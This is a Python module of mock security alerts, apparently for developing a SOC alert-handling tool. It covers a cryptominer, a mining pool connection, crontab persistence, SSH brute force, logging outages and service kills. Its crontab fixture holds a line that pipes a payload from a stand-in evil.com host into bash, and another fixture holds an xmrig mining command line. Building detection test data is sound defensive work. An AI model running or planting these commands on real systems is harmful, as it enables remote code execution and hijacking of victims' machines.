"""Mock 预设告警 (开发用,替代真实 Wazuh/Suricata 告警源)"""
from __future__ import annotations

from datetime import datetime
from uuid import uuid4

from app.models.schemas import Alert, AssetRef, Severity


def xmrig_process_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh 可疑进程告警: xmrig + stratum cmdline"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="5710",
        rule_level=12,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="www-data",
        asset=AssetRef(
            host_id=hostname,
            hostname=hostname,
            ips=[src_ip],
            criticality=Severity.high,
        ),
        raw={
            "sigma_id": "suspicious_cryptominer_process",
            "process_name": "xmrig",
            "pid": pid,
            "cmdline": "xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 48Bit... --cpu-max-threads-hint=75",
            "ppid": 28365,
            "parent_process": "/tmp/.xmrig/xmrig",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1496 Resource Hijacking", "T1071.001 Web Protocols"],
        message="Suspicious cryptominer process xmrig detected with stratum cmdline",
    )


def mining_pool_connection_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str = "192.168.64.1",
) -> Alert:
    """Suricata 矿池连接告警"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="suricata",
        rule_id="ET MALWARE Cryptomining",
        rule_level=2,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(
            hostname=hostname,
            ips=[src_ip],
            criticality=Severity.high,
        ),
        raw={
            "sigma_id": "cryptomining_stratum_protocol",
            "dst_port": 3333,
            "protocol": "stratum+tcp",
            "dst_domain": "pool.supportxmr.com",
            "signature": "ET POLICY Cryptocurrency Mining Pool Connection",
        },
        mitre_tactics=["TA0040 Impact", "TA0011 Command and Control"],
        mitre_techniques=["T1496 Resource Hijacking", "T1071.001 Web Protocols"],
        message="Outbound connection to known mining pool pool.supportxmr.com:3333",
    )


def high_cpu_anomaly_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """CPU 持续高占用异常"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="cpu_anomaly",
        rule_level=7,
        severity=Severity.medium,
        src_ip=src_ip,
        asset=AssetRef(hostname=hostname, ips=[src_ip]),
        raw={
            "cpu_usage": 97,
            "duration_minutes": 12,
            "top_process": "xmrig",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1496 Resource Hijacking"],
        message="CPU usage 97% for 12 minutes, top process xmrig",
    )


# ============ 横向扩展: 持久化 / 暴破 / 日志合规 / 服务崩溃 ============


def suspicious_crontab_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh FIM: 可疑 crontab 持久化"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="550",
        rule_level=10,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="www-data",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "suspicious_crontab_modification",
            "file_path": "/var/spool/cron/crontabs/www-data",
            "change_type": "modified",
            "added_line": "*/1 * * * * curl http://evil.com/payload.sh | bash",
        },
        mitre_tactics=["TA0003 Persistence"],
        mitre_techniques=["T1053.003 Cron"],
        message="Suspicious crontab modification detected: remote payload execution",
    )


def ssh_bruteforce_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh auth: SSH 暴力破解"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="5712",
        rule_level=10,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="root",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "ssh_bruteforce",
            "src_ip": "45.10.0.1",
            "failure_count": 247,
            "time_window_seconds": 300,
            "target_user": "root",
        },
        mitre_tactics=["TA0006 Credential Access", "TA0001 Initial Access"],
        mitre_techniques=["T1110 Brute Force", "T1110.001 Password Guessing", "T1021.004 SSH"],
        message="SSH brute force: 247 authentication failures from 45.10.0.1 in 5 minutes",
    )


def log_collection_stopped_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh agent 断连: 日志采集中断"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="502",
        rule_level=7,
        severity=Severity.medium,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.medium),
        raw={
            "sigma_id": "log_collection_stopped",
            "agent_id": "003",
            "disconnected_minutes": 18,
            "last_seen": "2026-08-21T01:55:00Z",
            "collector": "filebeat",
        },
        mitre_tactics=["TA0005 Defense Evasion"],
        mitre_techniques=["T1562 Impair Defenses", "T1562.008 Disable Cloud Logs"],
        message="Log collection stopped: agent 003 disconnected for 18 minutes",
    )


def critical_service_crash_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh: 关键服务被 kill"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="591",
        rule_level=8,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "critical_service_stopped",
            "service": "nginx",
            "termination_signal": "SIGKILL",
            "killed_by_pid": 29101,
            "killed_by_user": "unknown",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1489 Service Stop", "T1499 Endpoint Denial of Service"],
        message="Critical service nginx terminated by SIGKILL (kill -9)",
    )


# 预设告警类型注册表
MOCK_ALERTS = {
    "xmrig_process": xmrig_process_alert,
    "mining_pool_connection": mining_pool_connection_alert,
    "high_cpu_anomaly": high_cpu_anomaly_alert,
    "suspicious_crontab": suspicious_crontab_alert,
    "ssh_bruteforce": ssh_bruteforce_alert,
    "log_collection_stopped": log_collection_stopped_alert,
    "critical_service_crash": critical_service_crash_alert,
}
